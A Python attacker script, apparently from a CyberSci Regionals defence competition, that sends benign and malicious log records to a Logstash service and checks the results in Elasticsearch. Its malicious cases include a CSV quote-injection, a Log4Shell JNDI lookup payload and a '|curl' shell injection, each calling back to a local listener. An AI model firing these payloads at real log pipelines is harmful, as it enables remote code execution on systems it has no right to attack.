#!/usr/bin/python3
# -*- coding: utf8 -*-
#
# CyberSci Regionals 2026/27
#
# Log Monitor Attacker by Dmitriy Beryoza (0xd13a@gmail.com)

import pwn
import math
import traceback
import random
import requests
import time
import secrets
import hashlib
import json
import socket
import threading
from datetime import datetime, timezone
from siege.attacker.attacker import Attacker
from siege.core.attack_result import AttackResult
from faker import Faker

# Set up Faker library
fake = Faker()

# Determine the current IP for callback
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    sock.connect(("8.8.8.8", 80))
    LOCAL_IP = sock.getsockname()[0]

# Request timeouts
REQUEST_TIMEOUT = 3
MAX_RETRIES = 3
WAIT_BETWEEN_RETRIES = 3

# Ports to use for Logstash
PORT_DISSECT = 5000
PORT_LOG4SHELL = 5001
PORT_RUBY = 5002

# How many records to send at once
RECORDS_IN_SET = 10

LISTENER_TIMEOUT = 10

timber_types = [
    "oak",
    "pine",
    "maple",
    "birch",
    "cedar",
    "spruce",
    "fir",
    "ash",
    "beech",
    "walnut",
    "cherry",
    "mahogany",
    "teak",
    "poplar",
    "elm",
    "larch",
    "redwood",
    "cypress",
    "hickory",
]

# Known field names
F_HASH = "hash"
F_TIMESTAMP = "timestamp"
F_BATCHID = "batchid"
F_LASTNAME = "lastname"
F_FIRSTNAME = "firstname"
F_LOGLENGTH = "loglength"
F_LOGDIAMETER = "logdiameter"
F_NUMBEROFLOGS = "numberoflogs"
F_VOLUME = "volume"
F_TIMBERTYPE = "timbertype"


class LogMonitorAttacker(Attacker):

    bound_port = None
    listener_connected = False

    def __init__(self, host, port):
        super().__init__(host, port)

    def log(self, msg):
        print(msg)
        return

    # Create a listener to receive a callback request
    def run_listener(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", 0))
        server.listen(1)
        server.settimeout(LISTENER_TIMEOUT)

        def listen():
            with server:
                try:
                    # Exist right after a connection is made, we are only looking for a callback
                    connection, address = server.accept()
                    connection.close()
                    self.listener_connected = True
                except socket.timeout:
                    self.listener_connected = False

        thread = threading.Thread(target=listen, daemon=True)
        thread.start()
        return thread, server.getsockname()[1]

    # Prepare connection to Logstash
    def connect(self, service):
        retries = 0
        while retries < MAX_RETRIES:
            try:
                conn = pwn.remote(self.host, service, timeout=REQUEST_TIMEOUT, level='critical')
                #print(vars(conn))
                return conn
            except:
                retries += 1
            time.sleep(WAIT_BETWEEN_RETRIES)
            print("Retrying connection...")

        raise Exception("Service appears to be down.")

    # Create a set of fake records
    def create_record_set(self):
        record_set = []

        names = [fake.unique.first_name() for _ in range(RECORDS_IN_SET)]

        timestamp = datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")

        batchid = secrets.token_hex(8)

        for i in range(RECORDS_IN_SET):
            record = {}
            record[F_BATCHID] = batchid
            record[F_TIMESTAMP] = timestamp
            record[F_LASTNAME] = random.choice(["Beaver", "Castor"])
            record[F_FIRSTNAME] = names[i]
            record[F_LOGLENGTH] = random.randint(3, 20) 
            record[F_LOGDIAMETER] = random.randint(40, 200) 
            record[F_NUMBEROFLOGS] = random.randint(1, 10) 
            record[F_VOLUME] = int(math.pi * (record[F_LOGDIAMETER] /2.0 /100.00)**2 * record[F_LOGLENGTH] * record[F_NUMBEROFLOGS])
            record[F_TIMBERTYPE] = random.choice(timber_types)
            record_set.append(record)
        return batchid, record_set

    # Create a CSV row
    def build_csv_row(self, record):
        return f"{record[F_BATCHID]},{record[F_TIMESTAMP]},{record[F_LASTNAME]},{record[F_FIRSTNAME]}"\
               f",{record[F_LOGLENGTH]},{record[F_LOGDIAMETER]},{record[F_NUMBEROFLOGS]},{record[F_VOLUME]},{record[F_TIMBERTYPE]}"

    # Build CSV record set
    def build_csv(self, records):
        rendered_set = []

        for i in range(len(records)):
            text = self.build_csv_row(records[i])
            rendered_set.append(text)
        return rendered_set

    # Build a CSV record set with hashes for contents
    def build_csv_hashed(self, records):
        rendered_set = []

        for i in range(len(records)):
            text = self.build_csv_row(records[i])
            hash = hashlib.sha256(text.encode("utf-8")).hexdigest()
            rendered_set.append(f"{hash},{text}")
        return rendered_set

    # Build a set of JSON records
    def build_json(self, records):
        rendered_set = []

        for i in range(len(records)):
            rendered_set.append(json.dumps(records[i]))
        return rendered_set

    # Query Elasticsearch for the record set we just sent
    def query_records(self, batchid):

        repeat = MAX_RETRIES
        while repeat > 0:
        
            time.sleep(2)

            response = requests.post(f"http://{self.host}:9200/logs-unified/_search",
                        json={"query": {"bool": {"filter": [{"term": {"batchid.keyword": batchid}}]}}, "size": 100}, timeout=REQUEST_TIMEOUT)

            records = [hit["_source"] for hit in response.json()["hits"]["hits"]]

            if len(records) != 0:

                return records

            repeat -= 1
        return []

    # Check if retrieved records match what we sent in
    def records_match(self, orig_records, records):
        for orig in orig_records:
            matches = False
            for new_rec in records:
                if orig[F_TIMESTAMP] == new_rec[F_TIMESTAMP] and \
                    orig[F_BATCHID] == new_rec[F_BATCHID] and \
                    orig[F_LASTNAME] == new_rec[F_LASTNAME] and \
                    orig[F_FIRSTNAME] == new_rec[F_FIRSTNAME] and \
                    orig[F_LOGLENGTH] == new_rec[F_LOGLENGTH] and \
                    orig[F_LOGDIAMETER] == new_rec[F_LOGDIAMETER] and \
                    orig[F_NUMBEROFLOGS] == new_rec[F_NUMBEROFLOGS] and \
                    orig[F_VOLUME] == new_rec[F_VOLUME] and \
                    orig[F_TIMBERTYPE] == new_rec[F_TIMBERTYPE]:
                    matches = True
            if not matches:
                return False
        return True

    # Send records to Logstash
    def send_records(self, port, records):
        r = self.connect(port)
        try:
            for line in records:
                r.sendline(line.encode())
        finally:
            r.close()

    # Send good records to be parsed by Dissect
    def benign_dissect(self):

        batchid, orig_records = self.create_record_set()
        csv = self.build_csv(orig_records)

        self.send_records(PORT_DISSECT, csv)

        records = self.query_records(batchid)

        if not self.records_match(orig_records, records):
            return AttackResult.RESULT_FAILURE

        return AttackResult.RESULT_SUCCESS

    # Send malicious request with all zeros to be parsed by Dissect
    def malicious_dissect(self):

        batchid, orig_records = self.create_record_set()

        random_index = random.randint(0, len(orig_records)-1)

        # Dissect is not good at parsing double quotes in CSV
        orig_records[random_index][F_FIRSTNAME] = f'"{orig_records[random_index][F_FIRSTNAME]},0,0,0,0,{orig_records[random_index][F_TIMBERTYPE]}"'

        csv = self.build_csv(orig_records)

        self.send_records(PORT_DISSECT, csv)

        records = self.query_records(batchid)

        # remove bad record
        orig_records.pop(random_index)

        if not self.records_match(orig_records, records):
            return AttackResult.RESULT_SUCCESS

        for rec in records:
            if rec[F_LOGLENGTH] == 0 or rec[F_LOGDIAMETER] == 0 or rec[F_NUMBEROFLOGS] == 0 or rec[F_VOLUME] == 0:
                return AttackResult.RESULT_SUCCESS
        return AttackResult.RESULT_FAILURE

    # Send good records to be parsed in JSON 
    def benign_log4shell(self):

        batchid, orig_records = self.create_record_set()
        json = self.build_json(orig_records)

        self.send_records(PORT_LOG4SHELL, json)

        records = self.query_records(batchid)
        if not self.records_match(orig_records, records):
            return AttackResult.RESULT_FAILURE

        return AttackResult.RESULT_SUCCESS

    # Send a record set with a bad JSON
    def malicious_log4shell(self):

        batchid, orig_records = self.create_record_set()

        json = self.build_json(orig_records)

        random_index = random.randint(0, len(orig_records)-1)

        thread, port = self.run_listener()

        # We are intentionally removing last characters from JSON to trigger record to be logged and add a Log4Shell exploit
        json[random_index] = json[random_index][:-2] + f"${{jndi:ldap://{LOCAL_IP}:{port}}}"

        self.send_records(PORT_LOG4SHELL, json)

        records = self.query_records(batchid)

        thread.join()

        print(f"Log4Shell callback connected: {self.listener_connected}")

        # remove bad record
        orig_records.pop(random_index)

        if not self.records_match(orig_records, records) or not (len(orig_records) == len(records)):
            return AttackResult.RESULT_SUCCESS

        if self.listener_connected:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    # Send good CSV records to be parsed in Ruby
    def benign_ruby(self):

        batchid, orig_records = self.create_record_set()
        csv = self.build_csv_hashed(orig_records)

        self.send_records(PORT_RUBY, csv)

        records = self.query_records(batchid)

        if not self.records_match(orig_records, records):
            return AttackResult.RESULT_FAILURE

        return AttackResult.RESULT_SUCCESS

    # Send malicious record set to trigger a shell injecton
    def malicious_ruby(self):

        batchid, orig_records = self.create_record_set()

        csv = self.build_csv_hashed(orig_records)

        random_index = random.randint(0, len(orig_records)-1)

        # print(csv)

        thread, port = self.run_listener()
        csv[random_index] += f"|curl -s http://{LOCAL_IP}:{port}"

        self.send_records(PORT_RUBY, csv)

        records = self.query_records(batchid)

        thread.join()

        print(f"Shell in Ruby callback connected: {self.listener_connected}")

        # remove bad record
        orig_records.pop(random_index)

        if not self.records_match(orig_records, records) or not (len(orig_records) == len(records)):
            return AttackResult.RESULT_SUCCESS

        if self.listener_connected:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def benign_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.benign_dissect()
            elif id == 2:
                return self.benign_log4shell()
            elif id == 3:
                return self.benign_ruby()
        except BaseException:
            traceback.print_exc()
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id))

    def malicious_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.malicious_dissect()
            elif id == 2:
                return self.malicious_log4shell()
            elif id == 3:
                return self.malicious_ruby()
        except BaseException:
            traceback.print_exc()
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id))